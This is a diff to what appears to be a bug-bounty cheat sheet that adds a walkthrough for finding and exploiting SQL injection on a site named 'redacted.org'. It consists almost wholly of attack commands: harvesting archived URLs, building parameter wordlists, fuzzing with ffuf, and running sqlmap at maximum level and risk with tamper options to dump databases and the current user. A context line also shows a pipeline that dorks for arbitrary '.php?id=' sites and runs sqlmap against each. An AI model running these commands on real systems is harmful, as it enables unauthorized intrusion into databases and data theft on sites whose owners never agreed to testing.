@@ -169,6 +169,49 @@ sqlmap -m sqli --dbs --batch
 7. Send request to file and process it through sqlmap.
 ```
 
+**multiple SQL Injection with FFUF and Sqlmap in a few minutes target **`redacted.org`****
+
+```bash
+waybackurls https://redacted.org/ | uro | grep “.php” > php-files.txt
+
+-parse these files and grep only lines which contain get string and delete all before it and make it unique to avoid the duplicate, so our command will be
+
+cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | sort -u
+
+- remove .php string to make a list, so I just added the line to the last command cut -f1 -d”.”
+
+cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | cut -f1 -d”.” | sort -u 
+
+- spliting any two words to get parameters
+
+cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | cut -f1 -d”.” | sed ‘s/[A-Z]\+/\n&/g’ | sort -u > uppercase-parameters.txt
+
+head uppercase-parameters.txt
+
+cat php-files.txt| grep -i get | sed ‘s/.*.get//’ | cut -f1 -d”.” | sed ‘s/[A-Z]\+/\n&/g’ | sort -u | tr '[:upper:]' '[:lower:]' > lowercase-parameters.txt
+
+head lowercase-parameters.txt
+
+- so now we have two lists of parameters let’s test it with FFUF, firstly I’ll grep endpoint and test all params with it, I’ll try the lowercase-parameters first with this command:
+
+
+ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"
+
+- what about changing the request method to POST!
+
+ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"
+
+- And BINGOOOOOOO  I got commitment & id parameters as a result -
+
+- now go to the endpoint and intercept the request with burp and change the request method, add the parameter, and copy it to a txt file to run sqlmap on it
+
+sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast
+
+
+```
+
+
+
 ```bash
 go-dork -q "inurl:.php?id=" -p 1 -silent | gf sqli | grep -iE "[0-999]" | unfurl format "https://%d%p?%q" | sort -u | nuclei -t sqli2.yaml -silent | grep -Po "(http[s]?:\/\/)?([^\/\s]+\/)(.*)" > sqli.txt | for line in $(cat sqli.txt);do sqlmap -u "$line" --banner ;done
 ```
